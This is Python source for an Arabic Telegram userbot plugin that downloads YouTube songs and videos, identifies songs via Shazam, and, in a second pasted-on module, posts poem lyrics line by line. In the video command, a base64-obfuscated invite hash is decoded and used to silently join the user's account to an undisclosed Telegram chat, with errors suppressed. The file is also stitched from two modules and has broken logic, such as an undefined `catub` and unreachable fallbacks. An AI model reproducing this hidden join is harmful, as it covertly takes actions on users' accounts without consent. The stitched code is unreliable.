import asyncio
import glob
import base64
import io
import urllib.parse
import os
import random
from pathlib import Path
from yt_dlp import YoutubeDL
from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError, ChatSendMediaForbiddenError
from telethon.tl.functions.contacts import UnblockRequest as unblock
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import delete_conv, name_dl, song_dl, video_dl, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _catutils, reply_id
from . import l313l

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>يجؤة الانتظار قليلا يتم البحث على المطلوب</code>"
SONG_NOT_FOUND = "<code>عذرا لا يمكنني ايجاد اي اغنيه مثل هذه</code>"
SONG_SENDING_STRING = "<code>جارِ الارسال انتظر قليلا...</code>"
# =========================================================== #
#                                                             #
# =========================================================== #

# دالة للحصول على ملف الكوكيز
def get_cookies_file():
    folder_path = os.path.join(os.getcwd(), "karar")  # المسار إلى مجلد zion
    if not os.path.exists(folder_path):
        raise FileNotFoundError("Folder 'karar' not found in current directory")
        
    txt_files = glob.glob(os.path.join(folder_path, '*.txt'))  # البحث عن ملفات txt
    if not txt_files:
        raise FileNotFoundError("No .txt cookies files found in 'karar' folder")
        
    return random.choice(txt_files)  # اختيار ملف كوكيز عشوائي

@l313l.ar_cmd(
    pattern="بحث(320)?(?:\s|$)([\s\S]*)",
    command=("بحث", plugin_category),
    info={
        "header": "To get songs from youtube.",
        "description": "Basically this command searches youtube and send the first video as audio file.",
        "flags": {
            "320": "if you use song320 then you get 320k quality else 128k quality",
        },
        "usage": "{tr}song <song name>",
        "examples": "{tr}song memories song",
    },
)
async def _(event):
    "To search songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    
    # الحصول على الاستعلام للبحث
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على ما تريد البحث عنه")
    
    catevent = await edit_or_reply(event, "⌔∮ جاري البحث عن المطلوب انتظر")
    
    try:
        # الحصول على ملف الكوكيز
        cookie_file = get_cookies_file()
    except Exception as e:
        return await catevent.edit(f"❌ خطأ في الكوكيز: {str(e)}")
    
    # البحث عن الفيديو
    try:
        ydl_opts = {
            'cookiefile': cookie_file,  # استخدام ملف الكوكيز
            'extract_flat': True,
        }
        with YoutubeDL(ydl_opts) as ydl:
            search_results = ydl.extract_info(f"ytsearch:{query}", download=False)
            video_link = search_results['entries'][0]['url']  # الحصول على رابط الفيديو الأول
    except Exception as e:
        return await catevent.edit(f"❌ فشل البحث: {str(e)}")
    
    # تحديد جودة الصوت
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    
    # تنزيل المقطع الصوتي
    try:
        ydl_opts = {
            'cookiefile': cookie_file,  # استخدام ملف الكوكيز
            'format': 'bestaudio/best',
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': q,
            }],
            'outtmpl': f"{os.getcwd()}/temp/%(title)s.%(ext)s",  # حفظ الملف في مجلد temp
        }
        with YoutubeDL(ydl_opts) as ydl:
            info_dict = ydl.extract_info(video_link, download=True)
            song_file = ydl.prepare_filename(info_dict).replace('.webm', '.mp3')  # تغيير الامتداد إلى mp3
            title = info_dict.get('title', 'Unknown Title')  # الحصول على عنوان الفيديو
    except Exception as e:
        return await catevent.edit(f"❌ فشل التنزيل: {str(e)}")
    
    # إرسال الملف
    await catevent.edit("**⌔∮ جارِ الارسال انتظر قليلاً**")
    try:
        await event.client.send_file(
            event.chat_id,
            song_file,
            force_document=False,
            caption=f"**العنوان:** `{title}`",
            supports_streaming=True,
            reply_to=reply_to_id,
        )
        await catevent.delete()
    except Exception as e:
        await catevent.edit(f"❌ فشل الإرسال: {str(e)}")
    finally:
        # تنظيف الملفات المؤقتة
        if os.path.exists(song_file):
            os.remove(song_file)


@l313l.ar_cmd(
    pattern="فيديو(?:\s|$)([\s\S]*)",
    command=("فيديو", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def _(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على ما تريد البحث عنه")
    cat = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    catevent = await edit_or_reply(event, "⌔∮ جاري البحث عن المطلوب انتظر")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await catevent.edit(
            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
        )
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    try:
        stderr = (await _catutils.runcmd(video_cmd))[1]
        # if stderr:
        # return await catevent.edit(f"**Error :** `{stderr}`")
        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
        if stderr:
            return await catevent.edit(f"**Error :** `{stderr}`")
        catname = os.path.splitext(catname)[0]
        vsong_file = Path(f"{catname}.mp4")
    except:
        pass
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{catname}.mkv")
    elif not os.path.exists(vsong_file):
        return await catevent.edit(
            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
        )
    await catevent.edit("**⌔∮ جاري الارسال انتظر قليلا**")
    catthumb = Path(f"{catname}.jpg")
    if not os.path.exists(catthumb):
        catthumb = Path(f"{catname}.webp")
    elif not os.path.exists(catthumb):
        catthumb = None
    title = catname.replace("./temp/", "").replace("_", "|")
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        caption=f"**Title:** `{title}`",
        thumb=catthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await catevent.delete()
    for files in (catthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@l313l.ar_cmd(pattern="اسم الاغنية$")
async def shazamcmd(event):
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "⌔∮ يرجى الرد على مقطع صوتي او بصمه للبحث عنها"
        )
    catevent = await edit_or_reply(event, "**⌔∮ يتم معالجه المقطع الصوتي  .**")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            catevent, f"**⌔∮ لقد حدث خطأ ما اثناء البحث عن اسم الاغنيه:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**الاغنية:** `{song}`", reply_to=reply
    )
    await catevent.delete()


@l313l.ar_cmd(
    pattern="بحث2(?:\s|$)([\s\S]*)",
    command=("بحث2", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "usage": "{tr}song2 <song name>",
        "examples": "{tr}song2 memories song",
    },
)
async def _(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    catevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
        except YouBlockedUserError:
            await edit_or_reply(
                catevent, "**Error:** Trying to unblock & retry, wait a sec..."
            )
            await catub(unblock("songdl_bot"))
            purgeflag = await conv.send_message("/start")
        await conv.get_response()
        await conv.send_message(song)
        hmm = await conv.get_response()
        while hmm.edit_hide is not True:
            await asyncio.sleep(0.1)
            hmm = await event.client.get_messages(chat, ids=hmm.id)
        baka = await event.client.get_messages(chat)
        if baka[0].message.startswith(
            ("I don't like to say this but I failed to find any such song.")
        ):
            await delete_conv(event, chat, purgeflag)
            return await edit_delete(
                catevent, SONG_NOT_FOUND, parse_mode="html", time=5
            )
        await catevent.edit(SONG_SENDING_STRING, parse_mode="html")
        await baka[0].click(0)
        await conv.get_response()
        await conv.get_response()
        music = await conv.get_response()
        await event.client.send_read_acknowledge(conv.chat_id)
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>Title :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await catevent.delete()
        await delete_conv(event, chat, purgeflag)

import asyncio
from telethon import events
from .. import l313l
from ..core.managers import edit_or_reply
from ..helpers.utils import reply_id

# كلمات أغنية "قلبي يحدثني"
lyrics = [
    "قَلبي يُحدّثُني بأنّكَ مُتلِفي",
    "روحي فداكَ عرفتَ أمْ لمْ تعرفِ",
    "لم أقضِ حقَّ هَوَاكَ إن كُنتُ الذي",
    "لم أقضِ فيهِ أسى ً، ومِثلي مَن يَفي",
    "ما لي سِوى روحي، وباذِلُ نفسِهِ",
    "في حبِّ منْ يهواهُ ليسَ بمسرفِ",
    "فَلَئنْ رَضيتَ بها، فقد أسْعَفْتَني",
    "يا خيبة َ المسعى إذا لمْ تسعفِ",
    "يا مانِعي طيبَ المَنامِ، ومانحي",
    "ثوبَ السِّقامِ بهِ ووجدي المتلفِ",
    "عَطفاً على رمَقي",
    "، وما أبْقَيْتَ لي منْ جِسميَ المُضْنى وقلبي المُدنَفِ",
    "فالوَجْدُ باقٍ، والوِصالُ مُماطِلي",
    "والصّبرُ فانٍ، واللّقاءُ مُسَوّفي",
    "لم أخلُ من حَسدٍ عليكَ",
    "فلاتُضعْ سَهَري بتَشنيعِ الخَيالِ المُرْجِفِ",
    "واسألْ نُجومَ اللّيلِ:هل زارَ الكَرَى جَفني",
    "وكيفَ يزورُ مَن لم يَعرِفِ؟",
    "لا غَروَ إنْ شَحّتْ بِغُمضِ جُفونها",
    "عيني وسحَّتْ بالدُّموعِ الدُّرَّفِ",
    "وبماجرى في موقفِ التَّوديعِ منْ ألمِ النّوى",
    "شاهَدتُ هَولَ المَوقِفِ",
    "إن لم يكُنْ وَصْلٌ لَدَيكَ، فَعِدْ بهِ أملي",
    "وماطلْ إنْ وعدتَ ولاتفي",
    "لا تحسبوني في الهوى متصنِّعاً",
    "كلفي بكمْ خلقٌ بغيرِ تكلُّفِ"
]

@l313l.ar_cmd(
    pattern="قلبي يحدثني$",
    command=("قلبي يحدثني", plugin_category),
    info={
        "header": "إرسال كلمات أغنية 'قلبي يحدثني'.",
        "description": "يقوم بإرسال كلمات الأغنية سطرًا بسطر مع تأخير بين كل رسالة.",
        "usage": "{tr}قلبي يحدثني",
    },
)
async def send_lyrics(event):
    "إرسال كلمات أغنية 'قلبي يحدثني' سطرًا بسطر"
    try:
        # طباعة رسالة تأكيد بدء التنفيذ
        print("تم استدعاء الأمر '.قلبي يحدثني'")
        
        reply_to_id = await reply_id(event)
        catevent = await edit_or_reply(event, "**⌔∮ جارِ إرسال كلمات الأغنية...**")
        
        # حذف الرسالة الأولية بعد ثانيتين
        await asyncio.sleep(2)
        await catevent.delete()
        
        # إرسال كل سطر مع تأخير
        for line in lyrics:
            await event.client.send_message(event.chat_id, line, reply_to=reply_to_id)
            await asyncio.sleep(2)  # تأخير لمدة ثانيتين بين كل سطر
        
        print("تم إرسال كلمات الأغنية بنجاح")
    except Exception as e:
        print(f"حدث خطأ: {e}")
        await event.reply(f"حدث خطأ: {e}")
